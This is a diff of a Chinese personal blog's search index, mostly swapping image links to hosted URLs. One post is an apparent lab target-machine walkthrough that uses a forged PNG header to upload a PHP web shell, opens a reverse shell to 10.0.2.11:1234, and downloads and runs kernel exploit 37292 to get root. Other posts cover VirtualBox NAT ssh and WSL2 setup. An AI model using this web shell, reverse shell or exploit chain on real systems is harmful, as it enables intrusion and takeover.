+<h2 id="三、尝试反弹shell"><a href="#三、尝试反弹shell" class="headerlink" title="三、尝试反弹shell"></a>三、尝试反弹shell</h2><p>登陆上这个网页后，发现这个网站有上传图片的功能，很容易想到有可能可以利用的任意文件上传漏洞，先尝试直接上传<code>.php</code>文件，发现它会检查文件类型，将后缀名修改后也不能传输成功。说明网站不只是简单地进行了后缀名的检测，故尝试修改文件头来通过检测。将文件头的十六进制修改为<code>89504e470d0a1a0a</code>发现成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/770356d662f44b87159678359834e39c.png" alt="上传文件"></p>
 <ul>
-<li><p>思路一：<br>复制文件路径找到了<code>uploaded_images</code>的文件路径，拦截<code>show images</code>的请求，发现了命令执行漏洞，将load路径改为<code>uploaded_images/test.png</code>并修改<code>test.png</code>文件内容为<code>php-reverse-shell</code>文件的内容并重新上传，在终端中输入<code>nc -nvlp 1234</code>监听1234端口(<code>php-reverse-shell</code>文件中的ip地址和端口也要进行相应的修改)发现反弹shell成功：<br><img src="/image/post5/657b7cee052a9e8f40225abacc5b48d7.png" alt="反弹成功1"></p>
+<li><p>思路一：<br>复制文件路径找到了<code>uploaded_images</code>的文件路径，拦截<code>show images</code>的请求，发现了命令执行漏洞，将load路径改为<code>uploaded_images/test.png</code>并修改<code>test.png</code>文件内容为<code>php-reverse-shell</code>文件的内容并重新上传，在终端中输入<code>nc -nvlp 1234</code>监听1234端口(<code>php-reverse-shell</code>文件中的ip地址和端口也要进行相应的修改)发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/657b7cee052a9e8f40225abacc5b48d7.png" alt="反弹成功1"></p>
 </li>
-<li><p>思路二：<br>使用一句话木马以能在网站上运行命令，将<code>test.png</code>文件中的内容改为<code>&lt;?php system($_POST[‘cmd’]);?&gt;</code>，这个时候在拦截的POST请求的末尾加上<code>&amp;cmd=ls</code>，这个时候发现输出了文件目录中的内容，说明网站并没有限制一些敏感的参数。故将<code>php -r &#39;$sock=fsockopen(&quot;10.0.2.11&quot;,1234);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>先编码为url格式再复制到<code>&amp;cmd=</code>后面，发现反弹shell成功：<br><img src="/image/post5/8b14422e0a5b452ef833e53bbe2ebc3c.png" alt="反弹成功2"></p>
+<li><p>思路二：<br>使用一句话木马以能在网站上运行命令，将<code>test.png</code>文件中的内容改为<code>&lt;?php system($_POST[‘cmd’]);?&gt;</code>，这个时候在拦截的POST请求的末尾加上<code>&amp;cmd=ls</code>，这个时候发现输出了文件目录中的内容，说明网站并没有限制一些敏感的参数。故将<code>php -r &#39;$sock=fsockopen(&quot;10.0.2.11&quot;,1234);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>先编码为url格式再复制到<code>&amp;cmd=</code>后面，发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/8b14422e0a5b452ef833e53bbe2ebc3c.png" alt="反弹成功2"></p>
 </li>
 </ul>
-<h2 id="四、获取靶机root权限"><a href="#四、获取靶机root权限" class="headerlink" title="四、获取靶机root权限"></a>四、获取靶机root权限</h2><p>如果在之前查看了<code>/in</code>网页，很容易就可以发现靶机的内核信息过低：<br><img src="/image/post5/97c7819de7a0154dc34e75fa3317bee5.png" alt="内核信息"></p>
+<h2 id="四、获取靶机root权限"><a href="#四、获取靶机root权限" class="headerlink" title="四、获取靶机root权限"></a>四、获取靶机root权限</h2><p>如果在之前查看了<code>/in</code>网页，很容易就可以发现靶机的内核信息过低：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/97c7819de7a0154dc34e75fa3317bee5.png" alt="内核信息"></p>
 <p>如果查看<code>/in</code>网页也没有太大关系，输入以下命令可以查看靶机的内核版本以及发行版版本等各详细信息：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#查看内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release <span class="comment">#查看发行版版本等其他信息</span></span><br></pre></td></tr></table></figure>
 
 <p>接下来的事情就比较简单了，输入以下命令来完成内核漏洞的爆破：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在主机上：</span></span><br><span class="line">searchsploit privilege | grep 3.13 | grep linux <span class="comment">#查找可以利用的内核漏洞，发现编号为37292的文件</span></span><br><span class="line">searchsploit -m 37292 <span class="comment">#将该文件下载到本机</span></span><br><span class="line">python -m http.server:80 <span class="comment">#开启http服务方便靶机从主机下载文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在靶机上</span></span><br><span class="line"><span class="built_in">which</span> gcc <span class="comment">#检查运行环境，发现靶机有gcc工具，故不用管</span></span><br><span class="line">wget 10.0.2.11/37292.c <span class="comment">#从靶机上获取漏洞文件</span></span><br><span class="line">gcc 37292.c -o 37292 <span class="comment">#将.c文件编译链接为可执行文件</span></span><br><span class="line">./37292 <span class="comment">#执行文件来获得root权限</span></span><br></pre></td></tr></table></figure>
 
-<p>结果如下：<br><img src="/image/post5/49f523a8a93acf84df4012daf153be56.png" alt="结果"></p>
+<p>结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/49f523a8a93acf84df4012daf153be56.png" alt="结果"></p>
 ]]></content>
       <tags>
         <tag>Linux</tag>
@@ -228,11 +168,11 @@
     <title>通过ssh连接VirtualBox的nat网络模式下的虚拟机</title>
     <url>/post/46d9de96.html</url>
     <content><![CDATA[<p>写在前面：因为这学期要上传奇史课os，课程要求使用OpenEuler系统，为了方便用vscode编程使用了ssh来连接虚拟机。折腾的过程中发现桥接模式会随着你网络环境他的变化而产生网段的变化导致ssh配置发生变动，而nat模式下的虚拟机ip不会产生改变。而使用nat网络模式来进行连接相对麻烦一点儿，故有了该文章。</p>
-<h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="/image/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="/image/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="/image/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="/image/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p>
+<h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p>
 <h2 id="二、虚拟机的准备"><a href="#二、虚拟机的准备" class="headerlink" title="二、虚拟机的准备"></a>二、虚拟机的准备</h2><p>要想进行ssh连接，你的虚拟机必须要开启sshd服务，关于如何安装sshd服务请左转自行谷歌。<br>输入以下命令来设置ssh服务：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd <span class="comment">#启用sshd开机自启动</span></span><br><span class="line">systemctl start sshd <span class="comment">#启用sshd服务</span></span><br><span class="line">systemctl status sshd <span class="comment">#查看sshd服务状态</span></span><br></pre></td></tr></table></figure>
 
-<p>最后你的sshd服务状态应该类似于下图：<br><img src="/image/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p>
+<p>最后你的sshd服务状态应该类似于下图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p>
 <h2 id="三、ssh相关设置"><a href="#三、ssh相关设置" class="headerlink" title="三、ssh相关设置"></a>三、ssh相关设置</h2><ul>
 <li><p>测试连接<br>现在在确保虚拟机开着的情况下可以进行ssh的连接了。在cmd中输入以下命令<code>ssh -p 你设置的主机端口号 username(你想用什么身份登陆你的虚拟机)@127.0.0.1</code>来测试连接，若提示你输入密码进行登录则说明连接成功。</p>
 </li>
@@ -257,6 +197,66 @@
         <tag>ssh</tag>
         <tag>虚拟机</tag>
         <tag>VirtualBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WSL2的安装和简单配置</title>
+    <url>/post/87099e43.html</url>
+    <content><![CDATA[<p>写在前面：本教程使用的是Windows11的系统，不保证Windows10也适用。</p>
+<h2 id="一、为Windows启用Hyper-v虚拟化"><a href="#一、为Windows启用Hyper-v虚拟化" class="headerlink" title="一、为Windows启用Hyper-v虚拟化"></a>一、为Windows启用Hyper-v虚拟化</h2><ul>
+<li><p>按下win键，打开开始菜单，在搜索框中搜索<code>powershell</code>并按下右键选择以管理员身份运行。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/0865930a85e7def3f66138ae61450941.png" alt="展示"></p>
+</li>
+<li><p>输入命令来执行虚拟化操作：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName $(<span class="string">&quot;Microsoft-Windows-Subsystem-Linux&quot;</span>,<span class="string">&quot;VirtualMachinePlatform&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>  此操作需要重启，若询问是否立即重启执行操作，输入Y并按下回车键即可。</p>
+</li>
+</ul>
+<h2 id="二、设置WSL2默认版本为version2"><a href="#二、设置WSL2默认版本为version2" class="headerlink" title="二、设置WSL2默认版本为version2"></a>二、设置WSL2默认版本为version2</h2><p>在之前的管理员powershell界面输入<code>wsl --set-default-version 2</code>即可，之后可以输入<code>wsl -v</code>来确定版本。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/168383ad282389c72db900a0869ef219.png" alt="wsl版本"><br>现在win11默认的wsl版本就是2，此操作也可以不做。</p>
+<h2 id="三、下载Linux发行版"><a href="#三、下载Linux发行版" class="headerlink" title="三、下载Linux发行版"></a>三、下载Linux发行版</h2><h3 id="方案一：通过Microsoft-Store来进行下载"><a href="#方案一：通过Microsoft-Store来进行下载" class="headerlink" title="方案一：通过Microsoft Store来进行下载"></a>方案一：通过Microsoft Store来进行下载</h3><p>通过微软商店来下载非常简单，只需要在微软商店搜索对应的Linux发行版的名字即可进行下载。比如这里以下载ubuntu为例：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/d573d3eb16225db1e4a8dcf3c017d7b4.png" alt="Ubuntu"></p>
+<h3 id="方案二：通过命令行来进行安装-推荐"><a href="#方案二：通过命令行来进行安装-推荐" class="headerlink" title="方案二：通过命令行来进行安装(推荐)"></a>方案二：通过命令行来进行安装(推荐)</h3><ul>
+<li>使用<code>wsl -l -o</code>命令来查看当前可用的发行版。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/6b3a505f144d94c59fe6fb4d9589e697.png" alt="可用列表"></li>
+<li>使用<code>wsl --install -d &lt;distribution name&gt;</code>命令来下载指定的Linux发行版，这里的distribution name就是指上面那个操作中的第一列列出来的名称。</li>
+</ul>
+<p>等待耐心下载完并弹出相应提示之后，安装过程就完成了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出类似如下信息则启动成功</span></span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.153.1-microsoft-standard-WSL2 x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、-wslconfig文件设置"><a href="#四、-wslconfig文件设置" class="headerlink" title="四、.wslconfig文件设置"></a>四、.wslconfig文件设置</h2><ul>
+<li><p>进入<code>C:/Users/Username/</code>目录，如果当前目录不存在名为<code>.wslconfig</code>的文件，则手动创建一个。</p>
+</li>
+<li><p>用记事本打开<code>.wslconfig</code>文件并输入以下内容：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">autoMemoryReclaim=gradual  </span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=<span class="literal">true</span></span><br><span class="line">firewall=<span class="literal">true</span></span><br><span class="line">autoProxy=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这个操作之后可以使用<code>ip addr</code>命令查看ip地址并和在<code>powershell</code>中输入<code>ipconfig</code>后的地址进行对比，如若一样则网络模式修改成功。此外，上面的功能是Windows内部版本19041及更高版本中作为wsl2运行的发行版特有的，可以自行去看官网以了解更多功能<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-options">WSL配置</a>。</p>
+<h3 id="clash接管wsl2网络"><a href="#clash接管wsl2网络" class="headerlink" title="clash接管wsl2网络"></a>clash接管wsl2网络</h3><p>让clash接管wsl的网络，需要先在clash中打开<code>Allow LAN</code>功能。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/clash1.png" alt="clash"></p>
+<h4 id="方案一-你能使用wsl2的实验性功能"><a href="#方案一-你能使用wsl2的实验性功能" class="headerlink" title="方案一(你能使用wsl2的实验性功能)"></a>方案一(你能使用wsl2的实验性功能)</h4><p>确保上述的操作无误，输入<code>wget www.google.com</code>来确认clash确实已经接管了wsl的网络(此操作需要在Linux的不需要root写权限的目录下进行)。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wget www.google.com</span><br><span class="line"></span><br><span class="line">--2025-01-21 22:18:49--  http://www.google.com/</span><br><span class="line">Connecting to 127.0.0.1:7890... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html                        [ &lt;=&gt;                                              ]  19.35K  --.-KB/s    <span class="keyword">in</span> 0.05s</span><br><span class="line"></span><br><span class="line">2025-01-21 22:18:49 (376 KB/s) - ‘index.html’ saved [19818]</span><br></pre></td></tr></table></figure>
+
+<h4 id="方案二-你不能使用wsl2的实验性功能"><a href="#方案二-你不能使用wsl2的实验性功能" class="headerlink" title="方案二(你不能使用wsl2的实验性功能)"></a>方案二(你不能使用wsl2的实验性功能)</h4><p>这里借鉴了某<a href="https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/">大神</a>的方案，若你的wsl版本或者windows版本不能使用上面的配置，将<code>.wslconfig</code>中的内容改为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">dnsTunneling=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p>之后编辑Linux根目录下的<code>.bashrc</code>文件，加入以下三行内容</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">host_ip=$(<span class="built_in">cat</span> /etc/resolv.conf |grep <span class="string">&quot;nameserver&quot;</span> |<span class="built_in">cut</span> -f 2 -d <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的端口就是clash的port，如上面我的截图中clash的端口是7890(一般默认就是7890)。完成后输入<code>source ~/.bashrc</code>来让配置生效，可以输入<code>echo $http_proxy</code>来验证是否成功。</p>
+<h2 id="五、更换软件源"><a href="#五、更换软件源" class="headerlink" title="五、更换软件源"></a>五、更换软件源</h2><p>根据你使用的Linux发行版直接上网搜索相应的镜像源即可，这里给出一个汇总链接<a href="https://segmentfault.com/a/1190000000375848">镜像源</a>。复制相应的镜像源后，直接进行修改即可。这里以debian12更换清华源为例。</p>
+<ul>
+<li><p>访问<a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian/">debian清华镜像源</a>(网址中的debian可换成你的Linux发行版)并复制软件源。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换</span></span><br><span class="line">deb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>备份文件并修改文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份源文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"><span class="comment"># 修改文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/apt/sources.list</span><br><span class="line"><span class="built_in">sudo</span> vi /etc/apt/sources.list <span class="comment"># 将复制内容粘贴进去 </span></span><br></pre></td></tr></table></figure>
+
+<p>相信vim操作就不用教了吧，这里也可以使用你更熟悉的编辑器进行修改。</p>
+</li>
+</ul>
+<p>最后输入<code>sudo apt update</code>和<code>sudo apt upgrade</code>命令即可验证软件源是否修改成功。</p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>教程</tag>
+        <tag>WSL2</tag>
+        <tag>Windows11</tag>
       </tags>
   </entry>
 </search>
